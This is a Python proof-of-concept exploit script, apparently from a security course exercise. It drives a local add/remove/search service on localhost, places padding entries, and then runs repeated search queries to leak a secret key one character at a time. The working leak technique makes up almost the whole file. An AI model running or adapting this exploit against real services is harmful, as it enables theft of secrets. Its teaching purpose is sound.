#!/bin/python3


from encodings import utf_8
import socket
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost", 10001))


def send_txt(txt):
    txt = bytes(txt,"utf-8")
    s.send(txt)
    time.sleep(0.1)


def read_response():
    return s.recv(100)



# PART 1 : 
# remove the "Yet another test entry here!\n" here entry, so we can have a gab to play around with
r = read_response() #reads intial prompt (add/remove/search)
print(r)
send_txt("remove\n") #tell it we want to remove an entry
r = read_response() # read the prompt for the entry to remove
send_txt("Yet another test entry here!\n") #send the entry to remove 
r = read_response()
print(r)
# some sanity checking, removing the entry successfully should result in output that contains "found match"
if "found match" in str(r):
    print("=== removed successfully")

# PART 2 
# replace the entry we just removed with a new one. This is our padding, so the next entry starts one byte before the string we want to leak
# (you could go right up to the string you want to leak, but then you need to search the whole padding block + byte to compare, i think this was is just cleaner)

# the (add/remove/search) prompt has allready been read
send_txt("add\n") #add entry mode
r = read_response() # prompt
padding = (len("Yet another test entry here!") -1 ) * "A" + "\n"
print("==== padding " + padding)
send_txt(padding)
r = read_response() # prompt
print(r)
if "inserting" in str(r): #sanity check based on output
    print("=== added initial padding")


# PART 3 
# THE LEAK
#
#make a spot to store out results
leaked_value = ""
# could do this with char math too
validchars = "-qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVNM1234567890"

for i in range(0,63):
    ##add a one character entry. 
    send_txt("add\n") #add entry mode
    r = read_response() # prompt
    # print(r)
    send_txt("B\n") # Authors note: 
    # reusing the same single char instead of removing the entry, adding a new one char longer like "BB",
    # means we cannot check for character B after the first byte. 
    # given my knowledge that the key _doest_ contain the character "B", ive just removed it from validchars... :P
    # i expect students will just craft a better leak with growing padding or pick something exotic like "&" as the padding char.
    # this "A priori" trick is fine enough for a POC imo.
    r = read_response() # prompt
    # print(r)

    #now we will search for the following 
    # "Bx" where x is one of the ascii characters. if the search returns a match, we have leaked a character of our string!

    for c in validchars:
        # print("trying char " + c )
        send_txt("search\n") 
        r = read_response() # prompt
        # print(r)
        send_txt("B" + c + "\n")
        r = read_response() # prompt
        # print(r)
        if "found match" in str(r):
            print("=== LEAKED CHAR " + c)
            leaked_value += c
            print("currently leaked: " + leaked_value)
            break
